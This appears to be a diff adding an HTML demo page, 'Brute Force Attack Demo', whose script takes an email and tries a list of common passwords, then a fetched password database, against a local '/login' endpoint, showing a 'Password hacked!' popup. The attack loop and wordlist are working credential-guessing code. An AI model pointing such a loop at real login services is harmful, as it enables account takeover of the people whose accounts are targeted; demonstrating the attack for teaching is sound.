@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Brute Force Attack Demo</title>
+    <style>
+      body {
+        font-family: monospace, monospace;
+        background: #111;
+        color: #0f0;
+        padding: 30px 40px;
+        line-height: 1.6;
+      }
+      h2 {
+        font-size: 2.8rem;
+        margin-bottom: 15px;
+        color: #3399ff;
+      }
+      label {
+        font-size: 1.3rem;
+        font-weight: bold;
+      }
+      #emailInput {
+        font-size: 1.3rem;
+        padding: 10px 14px;
+        margin: 12px 0 24px 0;
+        width: 350px;
+        max-width: 90vw;
+        border-radius: 6px;
+        border: 1px solid #0f0;
+        background: #222;
+        color: #0f0;
+      }
+      button {
+        font-size: 1.3rem;
+        padding: 12px 22px;
+        margin-bottom: 30px;
+        background: #007bff;
+        border: none;
+        border-radius: 8px;
+        color: white;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+      button:hover {
+        background: #0056b3;
+      }
+      #log {
+        background: #000;
+        padding: 20px 25px;
+        height: 420px;
+        overflow-y: auto;
+        border-radius: 12px;
+        border: 1.5px solid #0f0;
+        white-space: pre-wrap;
+        font-size: 1.1rem;
+        box-shadow: 0 0 12px #0f0aaaff;
+      }
+      .info {
+        margin-bottom: 20px;
+        font-size: 1.1rem;
+        color: #66ccff;
+        max-width: 600px;
+      }
+      .note {
+        font-size: 1rem;
+        color: #55cc55;
+        margin-bottom: 40px;
+        max-width: 600px;
+      }
+      /* Modal styles */
+      #popupModal {
+        display: none; /* hidden by default */
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.75);
+        align-items: center;
+        justify-content: center;
+      }
+      #popupContent {
+        background-color: #007bff;
+        color: white;
+        padding: 30px 40px;
+        border-radius: 12px;
+        text-align: center;
+        font-size: 1.5rem;
+        max-width: 400px;
+        box-shadow: 0 0 20px #0f0;
+      }
+      #popupContent strong {
+        font-size: 2rem;
+      }
+
+      #fetchProgress {
+        color: #66ccff;
+        margin-bottom: 12px;
+        font-size: 1.2rem;
+      }
+    </style>
+  </head>
+  <body>
+    <label for="emailInput">Enter email to Hack Password :</label><br />
+    <input
+      type="email"
+      id="emailInput"
+      placeholder="user@example.com"
+      autocomplete="off"
+    /><br />
+    <button onclick="startBruteForce()">Start Brute Force</button>
+
+    <pre id="log"></pre>
+    <div id="fetchProgress"></div>
+
+    <!-- Popup modal -->
+    <div id="popupModal">
+      <div id="popupContent">
+        <p>⚠️ <strong>Password hacked!</strong></p>
+        <p>Your password is: <span id="popupPassword"></span></p>
+        <p>Redirecting shortly...</p>
+      </div>
+    </div>
+
+    <script>
+      const logEl = document.getElementById("log");
+      const popupModal = document.getElementById("popupModal");
+      const popupPassword = document.getElementById("popupPassword");
+
+      function log(text) {
+        logEl.textContent += text + "\n";
+        logEl.scrollTop = logEl.scrollHeight;
+      }
+
+      const commonPasswords = [
+        "123456",
+        "password",
+        "123456789",
+        "12345678",
+        "12345",
+        "qwerty",
+        "abc123",
+        "football",
+        "monkey",
+        "letmein",
+        "shadow",
+        "master",
+        "696969",
+        "123123",
+        "password1",
+        "iloveyou",
+        "sunshine",
+        "welcome",
+        "ninja",
+        "mustang",
+        "password123",
+        "baseball",
+        "superman",
+        "12345678",
+        "qazwsx",
+        "trustno1",
+        "dragon",
+        "hunter",
+        "letmein123",
+        "admin",
+        "princess",
+        "starwars",
+        "123qwe",
+        "login",
+        "solo",
+        "passw0rd",
+        "freedom",
+        "whatever",
+        "hello",
+        "charlie",
+        "666666",
+        "aaaaaa",
+        "tigger",
+        "hockey",
+        "ranger",
+        "george",
+        "computer",
+        "michelle",
+        "jennifer",
+        "111111",
+        "1234",
+        "000000",
+        "ashley",
+        "samsung",
+        "killer",
+        "pepper",
+      ];
+
+      async function delay(ms) {
+        return new Promise((r) => setTimeout(r, ms));
+      }
+
+      async function tryLogin(email, password) {
+        try {
+          const res = await fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password }),
+          });
+          const data = await res.json();
+          return data.success;
+        } catch (e) {
+          log("Error connecting to server");
+          return false;
+        }
+      }
+
+      async function fetchWithProgress(url, progressCallback) {
+        const res = await fetch(url);
+        if (!res.ok) throw new Error("Network response was not ok");
+
+        const contentLength = res.headers.get("Content-Length");
+        if (!contentLength) {
+          // No content length, fallback to normal fetch
+          const data = await res.json();
+          progressCallback(100);
+          return data;
+        }
+
+        const total = parseInt(contentLength, 10);
+        let loaded = 0;
+        const reader = res.body.getReader();
+        const chunks = [];
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          chunks.push(value);
+          loaded += value.length;
+          const percent = Math.floor((loaded / total) * 100);
+          progressCallback(percent);
+        }
+        const allChunks = new Uint8Array(loaded);
+        let position = 0;
+        for (const chunk of chunks) {
+          allChunks.set(chunk, position);
+          position += chunk.length;
+        }
+        const text = new TextDecoder("utf-8").decode(allChunks);
+        return JSON.parse(text);
+      }
+
+      async function startBruteForce() {
+        const email = document.getElementById("emailInput").value.trim();
+        if (!email) {
+          alert("Please enter an email");
+          return;
+        }
+
+        logEl.textContent = "";
+        log(`🔎 Starting brute force attack on: ${email}`);
+        log("🔐 Trying common passwords first...\n");
+
+        for (const pwd of commonPasswords) {
+          log(`Trying password: "${pwd}"`);
+          if (await tryLogin(email, pwd)) {
+            log(`\n✅ Password found: "${pwd}"`);
+            await showPopupThenRedirect(pwd);
+            return;
+          }
+          await delay(100);
+        }
+
+        log("\n❌ Common passwords failed, fetching password database...");
+        const fetchProgressEl = document.getElementById("fetchProgress");
+        let passwordDB;
+        try {
+          passwordDB = await fetchWithProgress("/password-list", (percent) => {
+            fetchProgressEl.textContent = `📥 Fetching password database: ${percent}%`;
+          });
+          fetchProgressEl.textContent = "";
+        } catch {
+          log("⚠️ Failed to fetch password database. Aborting.");
+          return;
+        }
+
+        log(
+          `📂 Password database fetched (${passwordDB.length} passwords). Starting database attack...\n`
+        );
+
+        function shuffleArray(array) {
+          for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+          }
+        }
+
+        const filteredDB = passwordDB.filter(
+          (p) => !commonPasswords.includes(p)
+        );
+        shuffleArray(filteredDB); // 🔀 Shuffle passwords before trying
+
+        for (let i = 0; i < filteredDB.length; i++) {
+          const pwd = filteredDB[i];
+          log(`Trying password: "${pwd}" (${i + 1}/${filteredDB.length})`);
+          if (await tryLogin(email, pwd)) {
+            log(`\n✅ Password found: "${pwd}"`);
+            await showPopupThenRedirect(pwd);
+            return;
+          }
+          await delay(10);
+        }
+
+        log("\n❌ Password NOT found in database. Brute force failed.");
+      }
+
+      async function showPopupThenRedirect(password) {
+        popupPassword.textContent = password;
+        popupModal.style.display = "flex";
+
+        // Wait 5 seconds then redirect
+        await delay(5000);
+        localStorage.setItem("hackedPassword", password);
+        window.location.href = "hacked.html";
+
+        // Fallback redirect after 6 seconds in case above fails
+        setTimeout(() => {
+          window.location.href = "hacked.html";
+        }, 6000);
+      }
+    </script>
+  </body>
+</html>
